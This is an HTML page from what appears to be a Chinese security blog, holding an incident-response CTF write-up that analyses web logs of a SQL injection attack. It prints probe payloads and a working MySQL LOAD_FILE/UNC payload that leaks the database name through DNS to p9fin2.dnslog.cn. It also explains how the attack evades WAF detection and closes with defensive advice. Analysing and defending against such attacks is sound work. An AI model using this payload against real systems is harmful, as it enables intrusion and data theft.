@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SQL注入DNS外带数据WriteUp · pressure-J</title>
+<meta name="description" content="企业安全团队发现 WAF 告警，业务系统遭受大量 SQL 注入扫描。进一步分析发现数据库服务器存在异常的 DNS 查询记录。结合 Web 访问日志，分析攻击者利用何种技术绕过检测并将数据库敏感信息外传。">
+<meta name="author" content="pressure-J">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://pressure-j.github.io/posts/sql-zhu-ru-dns-wai-dai-shu-ju-writeup.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="SQL注入DNS外带数据WriteUp · pressure-J">
+<meta property="og:description" content="企业安全团队发现 WAF 告警，业务系统遭受大量 SQL 注入扫描。进一步分析发现数据库服务器存在异常的 DNS 查询记录。结合 Web 访问日志，分析攻击者利用何种技术绕过检测并将数据库敏感信息外传。">
+<meta property="og:site_name" content="pressure-J">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/rss+xml" title="pressure-J" href="../rss.xml">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight.css">
+<script>
+(function() {
+  try {
+    var t = localStorage.getItem('theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+})();
+</script>
+</head>
+<body class="has-toc">
+<div class="progress-bar" id="progress"></div>
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">$</span><span class="brand-name">pressure-J</span><span class="brand-caret">_</span>
+    </a>
+    <nav class="site-nav" id="site-nav"><a href="../index.html">首页</a><a href="../posts.html" class="on">文章</a><a href="../category/index.html">分类</a><a href="../about.html">关于</a></nav>
+    <div class="header-tools">
+      <a class="icon-btn" href="../posts.html#search" aria-label="搜索">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </a>
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换主题">
+        <svg class="i-sun" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.4"/><path d="M12 2.2v2.2M12 19.6v2.2M2.2 12h2.2M19.6 12h2.2M4.9 4.9l1.6 1.6M17.5 17.5l1.6 1.6M19.1 4.9l-1.6 1.6M6.5 17.5l-1.6 1.6"/></svg>
+        <svg class="i-moon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M21 12.9A8.6 8.6 0 1 1 11.1 3a6.6 6.6 0 0 0 9.9 9.9z"/></svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menu-btn" type="button" aria-label="菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap post-layout">
+  <div class="post-main">
+    <nav class="breadcrumb">
+      <a href="../index.html">首页</a><span>/</span>
+      <a href="../category/ir.html">应急响应</a>
+    </nav>
+    <article class="post">
+      <header class="post-header">
+        <h1>SQL注入DNS外带数据WriteUp</h1>
+        <div class="post-meta">
+          <span class="cat-badge cat-ir">应急响应</span>
+          <time datetime="2026-07-08">2026-07-08</time>
+          <span>2433 字</span>
+          <span>约 6 分钟</span>
+        </div>
+        <div class="chips post-tags"><span class="chip">SQL注入</span><span class="chip">DNS</span><span class="chip">OOB</span><span class="chip">WriteUp</span></div>
+      </header>
+      <div class="content"><h2 id="_1">题目信息</h2>
+<p>企业安全团队发现 WAF 告警，业务系统遭受大量 SQL 注入扫描。进一步分析发现数据库服务器存在异常的 DNS 查询记录。结合 Web 访问日志，分析攻击者利用何种技术绕过检测并将数据库敏感信息外传。</p>
+<p><strong>目标</strong>：找出攻击者用于接收数据的域名。</p>
+<hr />
+<h2 id="_2">日志概况</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>统计项</th>
+<th>数值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>文件</td>
+<td><code>access.log</code>（Apache 访问日志）</td>
+</tr>
+<tr>
+<td>时间范围</td>
+<td><code>20/May/2024:14:00:00 ~ 20/May/2024:14:02:30</code></td>
+</tr>
+<tr>
+<td>服务器软件</td>
+<td>Apache（Combined Log Format）</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="_3">攻击链总览</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>Phase 1: SQL 注入探测 (多IP)
+  ├─ 89.248.165.99  → /product?id=1' INTO OUTFILE ...   → 403 (被WAF拦截)
+  └─ 46.101.88.33   → /product?id=1' AND SLEEP(1) ...    → 200 (探测成功)
+
+Phase 2: DNS外带数据 (关键攻击)
+  └─ 203.0.113.88   → /search?q=[SQL注入+DNS外传Payload] → 200 (绕过WAF提取数据)
+</code></pre></div></div>
+
+<hr />
+<h2 id="_4">详细分析</h2>
+<h3 id="_5">探测阶段</h3>
+<p>在日志中发现两条典型的 SQL 注入探测请求：</p>
+<p><strong>① INTO OUTFILE 尝试（被拦截）:</strong></p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>89.248.165.99 [14:01:40] GET /product?id=1' INTO OUTFILE '/tmp/out.txt' -- 
+Response: 403 (WAF拦截)
+</code></pre></div></div>
+
+<p><strong>② SLEEP 时间盲注探测（成功）:</strong></p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>46.101.88.33 [14:02:00] GET /product?id=1' AND SLEEP(1) --
+Response: 200 (注入点存在)
+</code></pre></div></div>
+
+<p>发现 <code>/product</code> 端点存在 SQL 注入但被 WAF 防护。</p>
+<h3 id="dns-oob">关键攻击：DNS 外带数据（OOB）</h3>
+<p>攻击者 <code>203.0.113.88</code> 在 <code>14:02:30</code> 仅用一个请求就完成了数据外传：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/search?q=1%27%20AND%20(SELECT%20load_file(concat(%27%5C%5C%5C%5C%27,(select%20database()),%27.p9fin2.dnslog.cn%5C%5Cabc%27)))%20--%20</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">(目标服务器)</span>
+</code></pre></div></div>
+
+<h4 id="url">URL 解码后：</h4>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="mi">1</span><span class="s1">' AND (SELECT load_file(concat('</span><span class="err">\\\\</span><span class="s1">',(select database()),'</span><span class="p">.</span><span class="n">p9fin2</span><span class="p">.</span><span class="n">dnslog</span><span class="p">.</span><span class="n">cn</span><span class="err">\\</span><span class="n">abc</span><span class="err">'</span><span class="p">)))</span><span class="w"> </span><span class="c1">-- </span>
+</code></pre></div></div>
+
+<hr />
+<h2 id="dns">DNS 外带技术原理</h2>
+<p>这是利用 MySQL 的 <strong>OOB（Out-Of-Band）数据外传</strong> 技术，也称为 <strong>DNS Exfiltration</strong>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>┌─────────────────┐         DNS查询请求          ┌──────────────────┐
+│  MySQL 服务器    │ ──────────────────────────→  │   DNS Server     │
+│                 │    dbname.p9fin2.dnslog.cn   │  (攻击者控制)    │
+│  LOAD_FILE(     │                              │                  │
+│   '\\dbname.    │                              │  日志记录:       │
+│    p9fin2.      │                              │  dbname.p9fin2. │
+│    dnslog.cn    │                              │  dnslog.cn       │
+│    \abc'        │                              │                  │
+│  )              │                              └──────────────────┘
+└─────────────────┘
+</code></pre></div></div>
+
+<h3 id="_6">关键函数与路径</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>组件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>LOAD_FILE()</code></td>
+<td>MySQL 读取文件函数，支持 UNC 路径</td>
+</tr>
+<tr>
+<td><code>concat('\\\\', ...)</code></td>
+<td>构造 UNC 路径 <code>\\数据库名.p9fin2.dnslog.cn\abc</code></td>
+</tr>
+<tr>
+<td><code>(select database())</code></td>
+<td>要外传的数据库名，嵌入子域名</td>
+</tr>
+<tr>
+<td><code>.p9fin2.dnslog.cn</code></td>
+<td><strong>攻击者控制的接收域名</strong></td>
+</tr>
+<tr>
+<td><code>dnslog.cn</code></td>
+<td>公共 DNS/HTTP 日志平台</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="waf">为何能绕过 WAF</h3>
+<ol>
+<li><strong>单次请求</strong>：仅 1 个 HTTP 请求即可完成数据外传</li>
+<li><strong>无回显依赖</strong>：不依赖 HTTP 响应内容，数据通过 DNS 通道外传</li>
+<li><strong>payload 不包含明显敏感词</strong>：<code>LOAD_FILE</code> + UNC 路径格式可能不在 WAF 规则库中</li>
+<li><strong>探测与利用分离</strong>：用 46.101.88.33 先确认注入点存在，再用 203.0.113.88 执行 OOB 外传</li>
+</ol>
+<hr />
+<h2 id="_7">结论</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>信息</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>攻击源 IP</strong></td>
+<td><code>203.0.113.88</code>（实际利用）/ <code>46.101.88.33</code>（探测）</td>
+</tr>
+<tr>
+<td><strong>攻击入口</strong></td>
+<td><code>/search?q=</code> 参数</td>
+</tr>
+<tr>
+<td><strong>注入类型</strong></td>
+<td>SQL 注入（MySQL）</td>
+</tr>
+<tr>
+<td><strong>数据外传技术</strong></td>
+<td><strong>OOB（Out-Of-Band）DNS Exfiltration</strong></td>
+</tr>
+<tr>
+<td><strong>利用函数</strong></td>
+<td><code>LOAD_FILE()</code> + UNC 路径</td>
+</tr>
+<tr>
+<td><strong>接收数据的域名</strong></td>
+<td><strong><code>p9fin2.dnslog.cn</code></strong></td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="_8">防御建议</h2>
+<ol>
+<li><strong>参数化查询</strong>：所有 SQL 查询使用 Prepared Statement</li>
+<li><strong>WAF 规则增强</strong>：添加 <code>LOAD_FILE</code>、UNC 路径（<code>\\\\</code>）等规则</li>
+<li><strong>出站 DNS 监控</strong>：对内部服务器发起的异常 DNS 查询进行告警</li>
+<li><strong>最小权限</strong>：MySQL 运行账户不应有 <code>LOAD_FILE</code> 权限，移除 <code>FILE</code> 权限</li>
+<li><strong>阻断 SMB 出站</strong>：防火墙阻止数据库服务器向外的 SMB（445）和 DNS 隧道流量</li>
+</ol>
+<hr />
+<h2 id="_9">参考</h2>
+<ul>
+<li><a href="http://dnslog.cn">dnslog.cn</a> - 公共 DNS/HTTP 日志平台</li>
+<li>MySQL OOB Injection - 利用 LOAD_FILE 进行 DNS 外带数据</li>
+</ul></div>
+      <div class="post-nav"><a class="pn-item prev" href="dns-wai-dai-sql-zhu-ru-jie-ti-si-lu.html"><span>← 上一篇</span><strong>DNS外带SQL注入解题思路</strong></a><a class="pn-item next" href="webshell-encrypted-tunnel.html"><span>下一篇 →</span><strong>Webshell上传与加密隧道分析WriteUp</strong></a></div>
+      <div class="post-end">
+        <a href="../posts.html">← 返回文章列表</a>
+        <a href="https://github.com/pressure-J" target="_blank" rel="noopener">在 GitHub 上找我</a>
+      </div>
+    </article>
+  </div>
+  <aside class="toc" id="toc">
+  <div class="toc-title">目录</div>
+  <nav><a href="#_1" class="toc-lv2">题目信息</a><a href="#_2" class="toc-lv2">日志概况</a><a href="#_3" class="toc-lv2">攻击链总览</a><a href="#_4" class="toc-lv2">详细分析</a><a href="#_5" class="toc-lv3">探测阶段</a><a href="#dns-oob" class="toc-lv3">关键攻击：DNS 外带数据（OOB）</a><a href="#dns" class="toc-lv2">DNS 外带技术原理</a><a href="#_6" class="toc-lv3">关键函数与路径</a><a href="#waf" class="toc-lv3">为何能绕过 WAF</a><a href="#_7" class="toc-lv2">结论</a><a href="#_8" class="toc-lv2">防御建议</a><a href="#_9" class="toc-lv2">参考</a></nav>
+</aside>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <div class="footer-col footer-about">
+      <div class="footer-brand">pressure-J<span class="brand-caret">_</span></div>
+      <p>网络安全 · 应急响应 · 流量分析<br>写能复现、能讲清楚的东西。</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">导航</div>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">全部文章</a>
+      <a href="../category/index.html">分类</a>
+      <a href="../about.html">关于</a>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">在别处</div>
+      <a href="https://github.com/pressure-J" target="_blank" rel="noopener">GitHub</a>
+      <a href="mailto:1489955298@qq.com">Email</a>
+      <a href="../rss.xml">RSS</a>
+    </div>
+  </div>
+  <div class="wrap footer-bottom">
+    <span>© 2026 pressure-J</span>
+    <span class="footer-build">Build 2026-10-19 · Python + Markdown</span>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="回到顶部">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</button>
+<script src="../assets/app.js" defer></script>
+</body>
+</html>
